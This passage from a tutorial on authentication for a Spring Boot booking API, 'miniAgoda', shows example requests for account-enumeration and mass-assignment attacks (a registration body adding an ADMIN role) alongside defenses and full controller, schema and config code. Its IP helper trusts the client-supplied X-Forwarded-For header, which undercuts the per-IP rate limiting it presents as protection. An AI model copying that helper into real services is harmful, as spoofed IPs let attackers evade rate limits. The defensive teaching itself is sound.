For a pure JWT API with `SameSite=Strict` cookies — CSRF is largely mitigated. For maximum safety, use both.

### Attack 6 — Account Enumeration

**How it works**

Subtle information leaks reveal which accounts exist:

```
POST /auth/login { email: "mario@gmail.com", password: "wrong" }
→ "Invalid password"           ← reveals email EXISTS

POST /auth/login { email: "nobody@gmail.com", password: "wrong" }
→ "No account found"           ← reveals email DOESN'T EXIST
```

Attacker builds a list of valid emails for targeted phishing or credential stuffing.

**Defense — Uniform Responses**
Already covered in Topic 4, but worth repeating as a named attack:

```java
// Always same message, same timing
return ResponseEntity
    .status(HttpStatus.UNAUTHORIZED)
    .body(new ErrorResponse("Invalid email or password"));
```

Same applies to password reset:

```
❌  "No account found with that email"
✓   "If that email is registered, you'll receive a reset link"
```

### Attack 7 — Mass Assignment

**How it works**

Attacker sends extra fields in a request body hoping they get mapped to sensitive model fields:

```java
POST /auth/register
{
  "email": "mario@gmail.com",
  "password": "sunshine99",
  "role": "ADMIN"              ← attacker adds this
}
```

If your code maps the entire request body to a User object — attacker just made themselves an admin.

**Defense — Explicit DTOs**

Never map request bodies directly to your DB entity. Use a dedicated DTO:

```java
// DTO — only contains what registration should accept
public record RegisterRequest(
    @Email   String email,
    @Size(min = 8, max = 72) String password
    // role is NOT here — period
) {}

// Service — role is hardcoded, not from request
User user = User.builder()
    .email(request.email())
    .passwordHash(passwordEncoder.encode(request.password()))
    .role(Role.GUEST)
    .build();
```

### Defense Summary

| Attack | Defense |
|---|---|
| Brute force | Rate limit per IP + per email, Redis-backed |
| Credential stuffing | Rate limiting + Have I Been Pwned check at registration |
| JWT tampering | Modern JJWT library, explicit algorithm, short expiry |
| Token theft (XSS) | HttpOnly cookies, never localStorage |
| CSRF | SameSite=Strict cookie flag |
| Account enumeration | Uniform error messages and response timing |
| Mass assignment | Explicit DTOs, never map request to entity directly |

#### Summary

* Brute force and credential stuffing — rate limit by both IP and email, Redis TTL handles cleanup
* JWT attacks — use modern libraries, explicitly specify algorithm, never accept `alg:none`
* XSS token theft — HttpOnly cookie makes token invisible to JavaScript
* CSRF — SameSite=Strict stops cross-site requests from carrying your cookie
* Enumeration — same message, same timing, always — for login, register, and password reset
* Mass assignment — DTOs are not optional, they're a security boundary

---

## Layer 4, Topic 12 — Fitting Auth into miniAgoda

### The Full System Map

**The Complete Picture**

You've learned every piece individually. Now let's wire them together into one coherent system — showing exactly how Auth sits alongside your existing Search, Booking, and Payment flows.

**The Full System Map**
```
┌───────────────────────────────────────────────────────────────────────┐
│                        miniAgoda API                                  │
│                                                                       │
│  PUBLIC                  AUTHENTICATED         ADMIN ONLY             │
│  ──────                  ─────────────         ──────────             │
│  GET  /hotels            POST /bookings        GET  /admin/users      │
│  POST /auth/register     GET  /bookings/my     POST /admin/refunds    │
│  POST /auth/login        DELETE /bookings/:id  PUT  /admin/hotels     │
│  POST /auth/refresh      POST /payments                               │
│  POST /auth/oauth2/**    POST /payments/refund                        │
│  POST /auth/logout       GET  /users/me                               │
└───────────────────────────────────────────────────────────────────────┘
         │                       │
         ▼                       ▼
  No token needed          JwtAuthFilter runs
                           ownership checked
                           role checked
```

### Complete Auth Flow — Registration to Booking

Let's trace a full user journey end to end:

```
1.  POST /auth/register          → creates account, hashes password
2.  POST /auth/login             → returns accessToken + refreshToken
3.  GET  /hotels?city=Bangkok    → public, no token needed
4.  POST /bookings               → requires token, ties booking to userId
5.  POST /payments               → requires token, verifies booking ownership
    (15 min later, token expires)
6.  POST /auth/refresh           → silent refresh, new accessToken
7.  DELETE /bookings/77          → requires token + ownership check
8.  POST /auth/logout            → revokes refreshToken, blocklists accessToken
```

### The Middleware Stack in Order

Every authenticated request passes through this exact sequence:

```java
// 1. JwtAuthFilter — extracts token, verifies, checks blocklist, sets SecurityContext
// 2. SecurityConfig route rules — public / authenticated / role-restricted
// 3. @PreAuthorize on controller method — fine-grained permission check
// 4. Ownership check inside service — does this user own this specific resource?
// 5. Business logic — actually do the thing
```
### Wiring Into Existing Controllers

#### Booking Controller — Before Auth

```java
// BEFORE — no concept of who is making the request
@PostMapping
public ResponseEntity<BookingResponse> createBooking(
        @RequestBody BookingRequest request
) {
    return ResponseEntity.ok(bookingService.create(request));
}
```
#### Booking Controller — After Auth

```
// AFTER — user identity flows through everything
@RestController
@RequestMapping("/bookings")
@RequiredArgsConstructor
public class BookingController {

    private final BookingService bookingService;

    // Create — any authenticated user
    @PostMapping
    @PreAuthorize("hasAuthority('BOOKING_CREATE')")
    public ResponseEntity<BookingResponse> createBooking(
            @RequestBody  @Valid BookingRequest request,
            @AuthenticationPrincipal UserDetails userDetails
    ) {
        Long userId = Long.parseLong(userDetails.getUsername());
        return ResponseEntity.ok(bookingService.create(userId, request));
    }

    // View own bookings
    @GetMapping("/my")
    @PreAuthorize("hasAuthority('BOOKING_VIEW_OWN')")
    public ResponseEntity<List<BookingResponse>> getMyBookings(
            @AuthenticationPrincipal UserDetails userDetails
    ) {
        Long userId = Long.parseLong(userDetails.getUsername());
        return ResponseEntity.ok(bookingService.findByUser(userId));
    }

    // Cancel — owner or admin
    @DeleteMapping("/{id}")
    @PreAuthorize("hasAuthority('BOOKING_CANCEL_ANY') or " +
                  "(hasAuthority('BOOKING_CANCEL_OWN') and " +
                  "@bookingAuthz.isOwner(#id, authentication))")
    public ResponseEntity<Void> cancelBooking(
            @PathVariable Long id,
            @AuthenticationPrincipal UserDetails userDetails
    ) {
        Long userId = Long.parseLong(userDetails.getUsername());
        bookingService.cancel(id, userId);
        return ResponseEntity.noContent().build();
    }
}
```

### Payment Controller — After Auth

```java
@RestController
@RequestMapping("/payments")
@RequiredArgsConstructor
public class PaymentController {

    private final PaymentService paymentService;

    @PostMapping
    @PreAuthorize("hasAuthority('PAYMENT_CREATE')")
    public ResponseEntity<PaymentResponse> createPayment(
            @RequestBody  @Valid PaymentRequest request,
            @AuthenticationPrincipal UserDetails userDetails
    ) {
        Long userId = Long.parseLong(userDetails.getUsername());
        return ResponseEntity.ok(paymentService.create(userId, request));
    }

    @PostMapping("/{id}/refund")
    @PreAuthorize("hasAuthority('PAYMENT_REFUND_ANY') or " +
                  "(hasAuthority('PAYMENT_REFUND_OWN') and " +
                  "@paymentAuthz.isOwner(#id, authentication))")
    public ResponseEntity<PaymentResponse> refund(
            @PathVariable Long id,
            @AuthenticationPrincipal UserDetails userDetails
    ) {
        Long userId = Long.parseLong(userDetails.getUsername());
        return ResponseEntity.ok(paymentService.refund(id, userId));
    }
}
```

### The Complete Auth Controller

```java
@RestController
@RequestMapping("/auth")
@RequiredArgsConstructor
public class AuthController {

    private final AuthService    authService;
    private final HttpServletResponse httpResponse;

    // Register
    @PostMapping("/register")
    public ResponseEntity<Void> register(
            @RequestBody @Valid RegisterRequest request
    ) {
        authService.register(request);
        return ResponseEntity.status(HttpStatus.CREATED).build();
    }

    // Login — sets HttpOnly cookies
    @PostMapping("/login")
    public ResponseEntity<Void> login(
            @RequestBody @Valid LoginRequest request,
            HttpServletRequest  httpRequest,
            HttpServletResponse httpResponse
    ) {
        String ip = getClientIp(httpRequest);
        AuthTokens tokens = authService.login(request, ip);
        setTokenCookies(httpResponse, tokens);
        return ResponseEntity.ok().build();
    }

    // Refresh — reads refreshToken cookie, issues new accessToken
    @PostMapping("/refresh")
    public ResponseEntity<Void> refresh(
            @CookieValue(name = "refreshToken", required = false) String refreshToken,
            HttpServletResponse httpResponse
    ) {
        if (refreshToken == null) {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        }
        AuthTokens tokens = authService.refresh(refreshToken);
        setTokenCookies(httpResponse, tokens);
        return ResponseEntity.ok().build();
    }

    // Logout — revokes tokens, clears cookies
    @PostMapping("/logout")
    public ResponseEntity<Void> logout(
            @CookieValue(name = "accessToken",  required = false) String accessToken,
            @CookieValue(name = "refreshToken", required = false) String refreshToken,
            HttpServletResponse httpResponse
    ) {
        authService.logout(accessToken, refreshToken);
        clearTokenCookies(httpResponse);
        return ResponseEntity.ok().build();
    }

    // Current user info
    @GetMapping("/me")
    public ResponseEntity<UserResponse> me(
            @AuthenticationPrincipal UserDetails userDetails
    ) {
        Long userId = Long.parseLong(userDetails.getUsername());
        return ResponseEntity.ok(authService.getMe(userId));
    }

    // ── Cookie helpers ───────────────────────────────────────
    private void setTokenCookies(HttpServletResponse response, AuthTokens tokens) {
        response.addHeader(HttpHeaders.SET_COOKIE,
            buildCookie("accessToken",  tokens.getAccessToken(),  "/",            15 * 60).toString());
        response.addHeader(HttpHeaders.SET_COOKIE,
            buildCookie("refreshToken", tokens.getRefreshToken(), "/auth/refresh", 7 * 24 * 60 * 60).toString());
    }

    private void clearTokenCookies(HttpServletResponse response) {
        response.addHeader(HttpHeaders.SET_COOKIE,
            buildCookie("accessToken",  "", "/",             0).toString());
        response.addHeader(HttpHeaders.SET_COOKIE,
            buildCookie("refreshToken", "", "/auth/refresh", 0).toString());
    }

    private ResponseCookie buildCookie(
            String name, String value, String path, long maxAgeSeconds) {
        return ResponseCookie.from(name, value)
            .httpOnly(true)
            .secure(true)
            .sameSite("Strict")
            .path(path)
            .maxAge(maxAgeSeconds)
            .build();
    }

    private String getClientIp(HttpServletRequest request) {
        String forwarded = request.getHeader("X-Forwarded-For");
        return (forwarded != null)
            ? forwarded.split(",")[0].trim()
            : request.getRemoteAddr();
    }
}
```

### Complete DB Schema — Auth Layer

```sql
-- Users
CREATE TABLE users (
    id            BIGSERIAL PRIMARY KEY,
    email         VARCHAR(255) UNIQUE NOT NULL,
    password_hash VARCHAR(255),                    -- null for OAuth users
    name          VARCHAR(255),
    picture       VARCHAR(500),
    role          VARCHAR(50) DEFAULT 'GUEST',
    provider      VARCHAR(50) DEFAULT 'LOCAL',     -- LOCAL, GOOGLE
    provider_id   VARCHAR(255),                    -- Google's user ID
    suspended     BOOLEAN DEFAULT FALSE,
    created_at    TIMESTAMP DEFAULT NOW(),
    last_login_at TIMESTAMP
);

CREATE UNIQUE INDEX idx_users_provider
    ON users(provider, provider_id)
    WHERE provider_id IS NOT NULL;

-- Refresh tokens
CREATE TABLE refresh_tokens (
    id          BIGSERIAL PRIMARY KEY,
    user_id     BIGINT REFERENCES users(id) ON DELETE CASCADE,
    token_hash  VARCHAR(255) NOT NULL,
    family_id   UUID NOT NULL,                     -- for reuse detection
    expires_at  TIMESTAMP NOT NULL,
    revoked     BOOLEAN DEFAULT FALSE,
    created_at  TIMESTAMP DEFAULT NOW()
);

CREATE INDEX idx_refresh_tokens_user ON refresh_tokens(user_id);

-- Hotel managers (for MANAGER role)
CREATE TABLE hotel_managers (
    user_id   BIGINT REFERENCES users(id),
    hotel_id  BIGINT REFERENCES hotels(id),
    PRIMARY KEY (user_id, hotel_id)
);
```

### Redis Keys

```
blocklist:jti:{jti}          → "1"   TTL = remaining token lifetime
ratelimit:email:{email}      → count  TTL = 60s window
ratelimit:ip:{ip}            → count  TTL = 60s window
```

### Environment Configuration

```yaml
# application.yml
jwt:
  secret: ${JWT_SECRET}
  access-token-expiry: 900000       # 15 minutes in ms
  refresh-token-expiry: 604800000   # 7 days in ms

spring:
  data:
    redis:
      host: ${REDIS_HOST}
      port: 6379
  security:
    oauth2:
      client:
        registration:
          google:
            client-id:     ${GOOGLE_CLIENT_ID}
            client-secret: ${GOOGLE_CLIENT_SECRET}
```

> Never hardcode secrets. Always environment variables.

#### What You Built — The Full Auth System

```
Layer 1 — Foundations
  ✅ Passwords hashed with bcrypt (cost 12)
  ✅ Identity carried via JWT in HttpOnly cookies
  ✅ Tokens: header.payload.signature, signed with HS256

Layer 2 — Core Implementation
  ✅ Registration with validation, enumeration protection
  ✅ Login with timing attack defense, brute force rate limiting
  ✅ Refresh tokens with rotation + reuse detection
  ✅ Logout with Redis blocklist + refresh token revocation

Layer 3 — Authorization
  ✅ JwtAuthFilter protects every route
  ✅ SecurityConfig declares public vs authenticated vs admin routes
  ✅ Ownership checks — fetch by id + userId, @PreAuthorize
  ✅ RBAC — GUEST / MANAGER / ADMIN with granular permissions

Layer 4 — Real World
  ✅ OAuth / Google Login — find or create user, issue miniAgoda JWT
  ✅ Brute force, credential stuffing, JWT tampering, XSS,
     CSRF, enumeration, mass assignment — all defended
  ✅ Wired into Search, Booking, Payment
```

---

## Bonus: Spring Security vs. Our Custom Code

Spring Security is **not separate** from the code written above — our code plugs into it.

### Spring Security is a Filter Chain

```
HTTP Request
     │
     ▼
┌─────────────────────────────┐
│      Spring Security        │
│      Filter Chain           │
│                             │
│  UsernamePasswordAuthFilter │  ← built-in
│  BasicAuthFilter            │  ← built-in
│  ExceptionTranslationFilter │  ← built-in
│  FilterSecurityInterceptor  │  ← built-in
│                             │
│  JwtAuthFilter  ← OURS      │  ← plugged in here
└─────────────────────────────┘
     │
     ▼
Your Controller
```

### What Spring Security Provides vs. What We Wrote

| Part | Who owns it | What it does |
|---|---|---|
| `OncePerRequestFilter` | Spring Security | Base class our `JwtAuthFilter` extends |
| `SecurityFilterChain` | Spring Security | The chain we configure in `SecurityConfig` |
| `SecurityContextHolder` | Spring Security | Where we store the authenticated user |
| `@PreAuthorize` | Spring Security | The annotation engine for permission checks |
| `UserDetails` / `UserDetailsService` | Spring Security | Interfaces we implement |
| `BCryptPasswordEncoder` | Spring Security | We just call it |
| `JwtAuthFilter` | **Us** | Our custom filter, plugged into the chain |
| `JwtUtil` | **Us** | Our JWT logic |
| `TokenBlocklistService` | **Us** | Our Redis logic |
| `Role` / `Permission` enums | **Us** | Our business domain |

### The One Line That Connects Everything

```java
.addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);
```

This tells Spring Security: *"run my JwtAuthFilter before your built-in auth filter."*

Everything else — `@PreAuthorize`, `SecurityContextHolder`, `hasAuthority()` — is pure Spring Security doing its job, powered by what our filter put into the `SecurityContext`.

> Spring Security is the stage. Our code is the actor.

---

## What to Build Next

Now that the foundation is solid:

1. **Email verification** — confirm email on registration
2. **Password reset** — forgot password flow
3. **2FA** — TOTP (Google Authenticator)
4. **Audit log** — who did what, when, from where
5. **Device management** — "logged in on 3 devices", revoke individual sessions
